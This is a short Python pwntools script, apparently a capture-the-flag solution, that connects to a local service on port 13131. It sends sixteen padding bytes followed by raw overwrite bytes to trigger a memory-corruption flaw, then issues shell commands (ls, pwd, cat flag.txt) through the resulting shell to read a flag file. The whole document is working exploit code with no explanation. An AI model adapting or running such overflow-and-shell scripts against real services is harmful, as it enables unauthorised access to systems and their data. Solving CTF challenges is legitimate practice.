#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

host = '127.0.0.1'
port = 13131
r = remote(host, port)

s = "a" * 16 + "\xff\x7f\xec\x1c\n"
r.send(s)
d = r.recv(2048)
print d

d = r.recv(2048)
print d

r.send('ls\n')
d = r.recv(2048)
print d

d = r.recv(2048)
print d

d = r.recv(2048)
print d

r.send('pwd\n') #/ctf/centers/flags
d = r.recv(2048)
print d

d = r.recv(2048)
print d

r.send('ls\n')
d = r.recv(2048)
print d

r.send("cat flag.txt\n")
d = r.recv(2048)
print  d


d = r.recv(2048)
print d

d = r.recv(2048)
print d

